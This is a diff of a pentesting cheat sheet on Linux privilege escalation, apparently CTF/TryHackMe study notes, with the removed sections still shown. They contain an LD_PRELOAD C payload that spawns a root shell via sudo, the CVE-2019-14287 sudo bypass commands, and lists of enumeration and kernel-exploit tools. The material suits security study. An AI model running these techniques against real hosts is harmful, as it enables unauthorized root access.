@@ -1,45 +1,5 @@
 # Compromise a Linux host
 
-[![linuxfundamentalspart1](../../_badges/thm/linuxfundamentalspart1.svg)](https://tryhackme.com/room/linuxfundamentalspart1)
-[![linuxfundamentalspart2](../../_badges/thm/linuxfundamentalspart2.svg)](https://tryhackme.com/room/linuxfundamentalspart2)
-[![linuxfundamentalspart3](../../_badges/thm/linuxfundamentalspart3.svg)](https://tryhackme.com/room/linuxfundamentalspart3)
-[![linux1](../../_badges/thm/linux1.svg)](https://tryhackme.com/room/linux1)
-[![linux2](../../_badges/thm/linux2.svg)](https://tryhackme.com/room/linux2)
-[![bashscripting](../../_badges/thm/bashscripting.svg)](https://tryhackme.com/room/bashscripting)
-[![linuxstrengthtraining](../../_badges/thm/linuxstrengthtraining.svg)](https://tryhackme.com/room/linuxstrengthtraining)
-[![catregex](../../_badges/thm/catregex.svg)](https://tryhackme.com/room/catregex)
-[![linuxprivesc](../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
-[![commonlinuxprivesc](../../_badges/thmp/commonlinuxprivesc.svg)](https://tryhackme.com/room/commonlinuxprivesc)
-[![linprivesc](../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
-[![linux_privilege_escalation](../../_badges/poat/linux_privilege_escalation.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
-
-<div class="row row-cols-md-2"><div>
-
-As there isn't much we can do as a regular user, we will try to elevate our level of privileges to root (administrator). You may have to do horizontal escalation first, i.g. moving to another account that has the same level of privilege, but may have different permissions.
-
-* Find misconfiguration <small>(sudo, system files, NFS...)</small>
-* Find a vulnerable service and exploit it <small>(apache, mysql...)</small>
-* Find processes/tasks/scripts in which you can inject data
-  * Cron tasks/jobs
-  * executables with the SUID bit
-  * ...
-* Find a vulnerability in the kernel
-* ...
-
-The **goal is to pop out a shell as root** (root shell), basically, the same as if the administrator used `sudo -s`.
-
-</div><div>
-
-There are many **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...
-
-* [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) (10.4k ⭐): enumerate host | script shell
-* [LinEnum](https://github.com/rebootuser/LinEnum) (5.4k ⭐): enumerate host | script shell
-* [traitor](https://github.com/liamg/traitor)  (5.4k ⭐): enumerate/exploit host | script in go
-* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (lse, 2.5k ⭐): enumerate host | script shell
-* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (1.1k ⭐): enumerate host | python script
-* [pwncat-cs](https://github.com/calebstewart/pwncat) (1.8k ⭐): enumerate/exploit host | script in Python
-</div></div>
-
 <hr class="sep-both">
 
 ## 🎁 GTFOBins 🎁
@@ -127,62 +87,6 @@ Others 🔎
 </div></div>
 
 > **NOTE**: don't forget to redirect any errors with `some_command 2> /dev/null`.
-
-<hr class="sep-both">
-
-## Exploit sudo
-
-*A good reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)* (1.6k ⭐).
-
-<div class="row row-cols-md-2"><div>
-
-[![picklerick](../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)
-[![linprivesc](../../_badges/thm-p/linprivesc.svg)](https://tryhackme.com/room/linprivesc#task-12)
-[![wgelctf](../../../_badges/thm-p/wgelctf.svg)](https://tryhackme.com/room/wgelctf)
-
-Try to find commands that can be run with sudo
-
-```bash
-$ sudo -nl # test if you can sudo without a password
-$ sudo -l # if you can't, try with your password
-# -> in both cases, if you were successful
-# and there are some interesting stuff such as:
-Matching Defaults entries for [...]:
-    [...] # vulnerable env variables? (LD_PRELOAD...)
-
-User [...] may run the following commands on [...]:
-    (root) /bin/tar # see tar#sudo on GTFOBins
-```
-
-It's possible for the administrator to only allow a command/multiple commands to be run as root by a user. This is the case with `tar` above. If you can see `ALL`, then you can run any command as root.
-</div><div>
-
-With LD_PRELOAD ([see explanation](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)) and env_keep option set, you can create a root shell by compiling the following code with `gcc -shared -fPIC init.c -o init.so`
-
-```c
-void _init() {
-    setgid(0);
-    setuid(0);
-    system("/bin/bash");
-}
-```
-
-```bash
-# running this will create a root shell
-$ LD_PRELOAD=/tmp/init.so tar
-```
-
-**sudo before 1.8.28 (CVE-2019-14287)**
-
-[![agentsudoctf](../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)
-
-If a user was allowed to run one specific command using sudo, such as `tar`, then it was possible for any other user to impersonate the authorized user, and run the command as root too.
-
-```bash
-$ sudo -u#-1 tar [...]
-$ sudo -u#4294967295 tar [...]
-```
-</div></div>
 
 <hr class="sep-both">
 
@@ -385,24 +289,6 @@ $ /tmp/pspy
 ```
 
 > **CTF**: they're usually running every minute or every 5 minutes.
-</div></div>
-
-<hr class="sep-both">
-
-## Kernel exploits
-
-<div class="row row-cols-md-2"><div>
-
-Kernel exploits should be used as the last resort, as they will most probably severely impact the machine state/crash the machine if they fail. You can find the complete list of CVEs for the Linux Kernel [here](https://www.linuxkernelcves.com/cves).
-
-* [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW) on Linux kernel <4.8.3
-</div><div>
-
-There are scripts, but remember that they may generate false positives or false negatives.
-
-* [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) (3.9k ⭐): still updated with new exploits
-* [Linux_Exploit_Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester) (1.6k ⭐): up to 4.x excluded
-* [Linux Kernel Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) (1.4k ⭐): up to 5.x excluded
 </div></div>
 
 <hr class="sep-both">
